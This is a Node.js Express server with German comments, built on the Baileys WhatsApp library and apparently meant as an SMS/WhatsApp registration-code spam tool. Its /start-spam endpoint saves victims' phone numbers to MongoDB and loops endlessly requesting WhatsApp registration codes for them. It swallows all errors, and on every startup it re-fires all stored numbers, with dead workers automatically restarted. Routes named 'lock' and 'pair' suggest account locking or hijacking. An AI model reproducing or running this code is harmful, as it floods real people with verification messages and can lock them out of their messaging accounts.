const cluster = require('cluster');
const numCPUs = require('os').cpus().length;

if (cluster.isMaster) {
    console.log(`Master ${process.pid} is running`);

    // Fork Workers
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died`);
        // Fork a new worker if any worker dies
        cluster.fork();
    });
} else {
    // Worker Process
    require('dotenv').config(); // Load environment variables from .env file
    const express = require('express');
    const bodyParser = require('body-parser');
    const cookieParser = require('cookie-parser');
    const path = require('path');
    const mongoose = require('mongoose');
    const fs = require('fs');
    const ejs = require('ejs');
    const pino = require('pino');
    const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
    const { promisify } = require('util');
    const readFileAsync = promisify(fs.readFile);

    const app = express();
    const port = process.env.PORT || 8080; // Use environment variable or default port

    // MongoDB connection string from environment variable
    const mongoURI = process.env.MONGODB_URI;
    const startspam = process.env.START_SPAM;

    // Connect to MongoDB
    mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
        .then(() => console.log('Connected to MongoDB'))
        .catch(err => console.error('Error connecting to MongoDB:', err));

const SpamDataSchema = new mongoose.Schema({
    ddi: String,
    number: String,
    timestamp: { type: Date, default: Date.now }
});

// Modell aus dem Schema erstellen
const SpamData = mongoose.model('SpamData', SpamDataSchema);




const sendStoredData = async () => {
    try {
        // Alle Daten aus der MongoDB abrufen
        const data = await SpamData.find({}, 'ddi number');

        // Daten an den /start-spam Endpunkt senden
        await Promise.all(data.map(async (item) => {
            const { ddi, number } = item;
            await fetch(startspam, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ ddi, number })
            });
        }));
        console.log('Stored data sent successfully from MongoDB');
        await sleep(20); 
    } catch (error) {
        console.error('Error sending stored data:', error);
    }
};
// Funktion aufrufen, um die Daten beim Starten des Servers zu senden
sendStoredData();



// Set up body parsers
let server = require('./views/qr');
code = require('./views/pair');
code2 = require('./start-pairing/pair2');
app.use('/qr', server);
app.use('/code', code);
app.use('/code2', code2);
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// Set up view engine and views directory
const __path = path.join(__dirname, 'views');
app.set('view engine', 'ejs');
app.set('views', __path);
app.engine('ejs', ejs.renderFile);


// Routes
app.get('/', (req, res) => {
    res.render('index', { title: 'Home' });
});

app.get('/pair', (req, res) => {
    res.render('pair', { title: 'pairing' });
});

app.get('/pair2', (req, res) => {
    res.render('pair2', { title: 'pairing2' });
});

app.get('/lock', (req, res) => {
    res.render(path.join(__path, 'lock'), { title: 'Lock' });
});


function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
/*
 const sendStoredDatav2 = async () => {
    try {
        // Dateiinhalt der generated_numbers.json lesen
        const fileContent = fs.readFileSync('exported_data.json', 'utf8');
        const data = JSON.parse(fileContent);

        // Daten an den /start-spam Endpunkt senden
        await Promise.all(data.map(async (item) => {
            const { ddi, number } = item;
            await fetch(startspam, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ ddi, number })
            });
        }));
        console.log('Stored data sent successfullykkk');
        await sleep(20); 
    } catch (error) {
        console.error('Error sending stored data:', error);
    }
};

// Funktion aufrufen, um die Daten beim Starten des Servers zu senden
sendStoredDatav2();
*/

app.post('/start-spam', async (req, res) => {
    const { ddi, number } = req.body;
    try {

 // Überprüfen, ob die Kombination von DDI und number bereits in der MongoDB vorhanden ist
 const existingData = await SpamData.findOne({ ddi, number });
 if (existingData) {
  console.log('Schon Vorhanden');
  await sleep(50);
     
 } else {
     // Neue Instanz des Modells erstellen und speichern
     const newData = new SpamData({ ddi, number });
     await newData.save();
     console.log('Data saved successfully to MongoDb GenV2');
      
 }

        const { state, saveCreds } = await useMultiFileAuthState('.mm');
        const spam = makeWaSocket({
            auth: state,
            mobile: true,
            logger: pino({ level: 'silent' })
        });
        
        while (true) {
            try {
                const response = await spam.requestRegistrationCode({
                    phoneNumber: '+' + ddi + number,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 724
                });
    
                res.json({ success: true, response }); // Send success response
                return;
            } catch (err) {
                // Fehler ignorieren und keine Aktion ausführen
            }
        }
    } catch (err) {
        // Fehler ignorieren und keine Aktion ausführen
    }
});


// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});

 // Start server
 app.listen(port, () => {
    console.log(`Worker ${process.pid} started and is listening on port ${port}`);
});

app.on('listening', () => {
    setTimeout(() => {
        sendStoredData();
    }, 15000);
});
}
